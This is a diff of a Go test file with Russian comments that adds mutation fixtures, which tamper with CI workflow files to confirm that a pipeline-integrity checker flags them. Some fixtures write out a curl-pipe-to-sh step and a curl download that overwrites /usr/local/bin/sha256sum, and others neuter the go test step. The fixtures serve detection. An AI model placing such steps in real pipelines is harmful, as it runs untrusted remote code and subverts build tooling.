@@ -432,11 +432,27 @@ var plants = []plant{
 		wantTest: progs, wantMsg: "встречается 2 раз вместо одного", also: []string{tenv}},
 	// --- инцидент v0.3.0-rc.1: окружение job test release.yml = job checks ci.yml ---
 	{name: "rc1-shells-step-gone-release", edits: rel("        if: matrix.os == 'linux'\n        run: |\n          set -euo pipefail\n          sudo apt-get install -y busybox\n", "        run: echo нет\n"),
-		wantTest: tenv, wantMsg: "release.yml test нет шага установки busybox", also: []string{progs}},
+		wantTest: tenv, wantMsg: "release.yml test до go test нет шага установки busybox", also: []string{progs}},
 	{name: "rc1-shells-gate-release", edits: rel("        if: matrix.os == 'linux'\n        run: |\n          set -euo pipefail\n          sudo apt-get install -y busybox\n", "        if: matrix.os == 'macos'\n        run: |\n          set -euo pipefail\n          sudo apt-get install -y busybox\n"),
-		wantTest: tenv, wantMsg: "release.yml test нет шага установки busybox"},
+		wantTest: tenv, wantMsg: "release.yml test до go test нет шага установки busybox"},
 	{name: "rc1-env-step-extra-ci", edits: ci("          sudo apt-get install -y libgl1-mesa-dev xorg-dev\n", "          sudo apt-get install -y libgl1-mesa-dev xorg-dev libfoo-dev\n"),
-		wantTest: tenv, wantMsg: "шаги подготовки окружения тестов разошлись"},
+		wantTest: tenv, wantMsg: "шаги job до go test разошлись"},
+	// AU-LOGIC High-1: шаг busybox перенесён ПОСЛЕ go test — тесты снова идут без него.
+	{name: "rc1-shells-after-gotest-release", edits: []edit{
+		{releaseYML, "        if: matrix.os == 'linux'\n        run: |\n          set -euo pipefail\n          sudo apt-get install -y busybox\n", "        run: echo перенесено\n"},
+		{releaseYML, "        run: go test -timeout=20m -race -count=1 ./core/ ./internal/... ./cmd/cli/ ./cmd/gui/\n", "        run: go test -timeout=20m -race -count=1 ./core/ ./internal/... ./cmd/cli/ ./cmd/gui/\n\n      - name: Оболочки для скрипта записи (busybox, dash)\n        if: matrix.os == 'linux'\n        run: |\n          set -euo pipefail\n          sudo apt-get install -y busybox\n"}},
+		wantTest: tenv, wantMsg: "стоит ПОСЛЕ go test"},
+	// лишний неустановочный шаг до go test только в одном файле
+	{name: "rc1-extra-step-ci", edits: ci("      - name: go vet\n", "      - name: Лишний\n        run: echo x\n\n      - name: go vet\n"),
+		wantTest: tenv, wantMsg: "шаги job до go test разошлись"},
+	{name: "rc1-curl-sh-release", edits: rel("      - name: go vet\n", "      - name: Лишний\n        run: curl -fsSL https://example.invalid/x.sh | sh\n\n      - name: go vet\n"),
+		wantTest: tenv, wantMsg: "шаги job до go test разошлись", also: []string{pipes, progs}},
+	{name: "rc1-only-in-one-stale", edits: ci("      - name: Версии инструментов (раннер предъявляет себя)\n        # Оба ложных PASS", "      - name: Версии инструментов (2)\n        # Оба ложных PASS"),
+		wantTest: tenv, wantMsg: "запись onlyInOne"},
+	// QA-01 Н1: подмена утилиты загрузкой, под if, только в ci.yml — не
+	// установка пакета, маркеры бы её не узнали; закрытый список шагов — узнаёт.
+	{name: "rc1-qa-curl-tool-ci", edits: ci("      - name: go vet\n", "      - name: Подмена\n        if: matrix.os == 'linux'\n        run: curl -fsSL https://example.org/tool -o /usr/local/bin/sha256sum\n\n      - name: go vet\n"),
+		wantTest: tenv, wantMsg: "шаги job до go test разошлись"},
 	{name: "rc1-job-env-release", edits: rel("  test:\n    name: test (${{ matrix.os }})\n", "  test:\n    name: test (${{ matrix.os }})\n    env:\n      GOFLAGS: -mod=mod\n"),
 		wantTest: tenv, wantMsg: "env: job", also: []string{goenv}},
 	{name: "a3b-install-gone", edits: ci("          sudo apt-get install -y busybox\n", "          sudo apt-get install -y busybox-static\n"),
@@ -598,21 +614,21 @@ var plants = []plant{
 			"        run: |\n          go test -timeout=20m -race -count=1 ./core/ ./internal/... ./cmd/cli/ ./cmd/gui/\n          echo ok\n"}},
 		wantTest: gtm, wantMsg: "после вызова стоит строка «echo ok»"},
 	{name: "packages", edits: rel("./cmd/cli/ ./cmd/gui/\n", "./cmd/cli/\n"),
-		wantTest: gtm, wantMsg: "списки go test разошлись"},
+		wantTest: gtm, wantMsg: "списки go test разошлись", also: []string{tenv}},
 	// -timeout (решение ядра 02.10, cmd/gui на macOS > 10 мин): значение
 	// обязано совпадать в обоих файлах.
 	{name: "timeout-differs", edits: rel("go test -timeout=20m -race", "go test -timeout=30m -race"),
-		wantTest: gtm, wantMsg: "аргумент «-timeout=30m» вне закрытого списка"},
+		wantTest: gtm, wantMsg: "аргумент «-timeout=30m» вне закрытого списка", also: []string{tenv}},
 	{name: "timeout-dropped-both", edits: []edit{
 		{ciYML, "go test -timeout=20m -race", "go test -race"},
 		{releaseYML, "go test -timeout=20m -race", "go test -race"}},
 		wantTest: gtm, wantMsg: "нет обязательного флага -timeout=20m"},
 	{name: "packages-order", edits: rel("-count=1 ./core/ ./internal/...", "-count=1 ./internal/... ./core/"),
-		wantTest: gtm, wantMsg: "списки go test разошлись — на теге проверяется не то, что на PR"},
+		wantTest: gtm, wantMsg: "списки go test разошлись — на теге проверяется не то, что на PR", also: []string{tenv}},
 	{name: "packages-dir", extraDir: "cmd/planted",
 		wantTest: gtm, wantMsg: "каталог cmd/planted с тестами не входит"},
 	{name: "gotest-if", edits: rel("      - name: go test -race\n", "      - name: go test -race\n        if: matrix.os == 'linux'\n"),
-		wantTest: gtm, wantMsg: "шаг go test обеззублен"},
+		wantTest: gtm, wantMsg: "шаг go test обеззублен", also: []string{tenv}},
 	{name: "gotest-or-true-both", edits: []edit{
 		{ciYML, "./cmd/cli/ ./cmd/gui/\n", "./cmd/cli/ ./cmd/gui/ || true\n"},
 		{releaseYML, "./cmd/cli/ ./cmd/gui/\n", "./cmd/cli/ ./cmd/gui/ || true\n"}},
